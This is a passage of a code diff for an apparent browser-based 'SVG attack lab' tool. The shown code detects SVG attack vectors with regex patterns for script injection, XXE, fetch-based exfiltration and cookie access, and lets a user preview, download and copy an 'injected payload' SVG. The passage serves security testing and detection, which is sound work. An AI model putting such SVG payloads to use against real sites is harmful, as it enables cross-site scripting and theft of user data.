+  • Set X-Content-Type-Options: nosniff
+
+<span style="color:var(--muted)">[ NOTE ] Test only on authorized targets in controlled environments.</span>
+`;
+}
+
+function detectVectors(svg) {
+  const v = [];
+  if (/onload=/i.test(svg))       v.push('Event handler: onload');
+  if (/<script/i.test(svg))       v.push('Script element injection');
+  if (/<foreignObject/i.test(svg)) v.push('foreignObject HTML namespace bypass');
+  if (/<!DOCTYPE/i.test(svg))     v.push('DOCTYPE / XXE entity declaration');
+  if (/<!ENTITY/i.test(svg))      v.push('External entity reference (XXE)');
+  if (/<image/i.test(svg) && /href/i.test(svg)) v.push('External resource load (image href)');
+  if (/fetch\s*\(/i.test(svg))    v.push('Fetch API call (data exfiltration)');
+  if (/document\.cookie/i.test(svg)) v.push('document.cookie access');
+  if (!v.length) v.push('No known vectors detected');
+  return v;
+}
+
+// ─────────────────────────────────────────────
+//  PREVIEW (sandboxed)
+// ─────────────────────────────────────────────
+function renderPreview(svg) {
+  const blob = new Blob([svg], { type: 'image/svg+xml' });
+  const url = URL.createObjectURL(blob);
+  const frame = document.getElementById('preview-frame');
+  frame.src = url;
+}
+
+// ─────────────────────────────────────────────
+//  DOWNLOAD / COPY
+// ─────────────────────────────────────────────
+function downloadOutput() {
+  if (!outputSVG) { alert('Inject a payload first.'); return; }
+  const blob = new Blob([outputSVG], { type: 'image/svg+xml' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'svg-attack-lab-' + selectedTech + '.svg';
+  a.click();
+}
+
+function copyOutput() {
+  if (!outputSVG) { alert('Nothing to copy.'); return; }
+  navigator.clipboard.writeText(outputSVG).then(() => {
+    document.getElementById('output-status-text').textContent = 'Copied to clipboard!';
+    setTimeout(() => document.getElementById('output-status-text').textContent = 'Ready', 2000);
+  });
+}
+
+// ─────────────────────────────────────────────
+//  UTILS
+// ─────────────────────────────────────────────
+function clearAll() {
+  document.getElementById('svg-input').value = '';
+  document.getElementById('output-box').innerHTML = '<span style="color:var(--muted)">// Cleared.</span>';
+  document.getElementById('analysis-box').innerHTML = '<span style="color:var(--muted)">Run an injection first...</span>';
+  document.getElementById('preview-frame').src = '';
+  outputSVG = '';
+  currentSVG = '';
+  document.getElementById('output-size').textContent = '0 bytes';
+}
+
+function setStatus(ok, msg) {
+  document.getElementById('status-dot').className = 'status-dot ' + (ok ? 'ready' : 'warn');
+  document.getElementById('status-text').textContent = msg;
+}
+
+function formatBytes(b) {
+  return b < 1024 ? b + ' B' : (b/1024).toFixed(1) + ' KB';
+}
+
+function escAttr(s) {
+  return s.replace(/"/g, '&quot;').replace(/'/g, '&apos;');
+}
+
+function stripRootAttrs(svg, attrs) {
+  let out = svg;
+  attrs.forEach(a => { out = out.replace(new RegExp(` ${a}="[^"]*"`, 'gi'), ''); });
+  return out;
+}
+
+// ─────────────────────────────────────────────
+//  TABS
+// ─────────────────────────────────────────────
+function switchTab(id, el) {
+  const panel = el.closest('.panel');
+  panel.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  panel.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+  panel.querySelector('#' + id).classList.add('active');
+}
+
+function switchTabByName(id) {
+  const el = document.querySelector(`[onclick*="${id}"]`);
+  if (el) switchTab(id, el);
+}
+
+// Drag & drop
+const ua = document.getElementById('upload-area');
+ua.addEventListener('dragover', e => { e.preventDefault(); ua.classList.add('drag-over'); });
+ua.addEventListener('dragleave', () => ua.classList.remove('drag-over'));
+ua.addEventListener('drop', e => {
+  e.preventDefault();
+  ua.classList.remove('drag-over');
+  const file = e.dataTransfer.files[0];
+  if (file) handleFileUpload({ target: { files: [file] } });
+});
+</script>
+</body>
+</html>
